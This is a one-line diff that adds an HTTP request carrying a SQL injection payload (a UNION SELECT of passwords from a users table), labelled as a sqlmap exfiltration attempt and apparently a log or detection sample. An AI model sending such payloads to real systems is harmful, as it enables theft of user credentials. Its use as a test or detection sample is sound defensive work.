@@ -1,0 +1,1 @@
+GET /search.php?q=1 UNION SELECT password FROM users -- sqlmap payload exfiltration attempt
